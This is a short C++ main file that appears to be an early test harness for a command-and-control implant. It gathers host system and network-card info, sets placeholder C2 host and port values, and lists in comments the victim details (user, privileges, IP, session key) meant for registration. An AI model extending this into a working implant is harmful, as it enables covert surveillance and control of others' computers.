#include <iostream>
#include <string>
#include "libs/nlohmann/json.hpp"
#include "execution/execution.hpp"
#include "crypto/aesgcm.hpp"
#include "comms/comms.hpp"
#include "file_io/file_io.h"
#include "sitawareness/sitawareness.hpp"
#include "config/config.hpp"

using json = nlohmann::json;



int main(){
    CONFIG config;
    std::string info = getInfo();
    std::cout << info << std::endl;

    json j = json::parse(info);
    std::cout << j["systeminfo"] << std::endl;
    
    config.computer_guid = std::string("dd848dea-b850-46a3-bfa2-44748cb90aed"); // TODO: get guid properly
    config.c2_fqdn = " ";
    config.c2_port = 12;

    std::string sys = j["systeminfo"];
    json sys_info = json::parse(sys);
    json reg;
    reg["computer_guid"] = config.computer_guid;
    std::cout << sys_info["Network Card(s)"] << std::endl;
    // reg['computer_name'];
    // reg['computer_user'];
    // reg['computer_guid'];
    // reg['computer_privileges'];
    // reg['connecting_ip_address'];
    // reg["session_key"];


    
    return 0;
}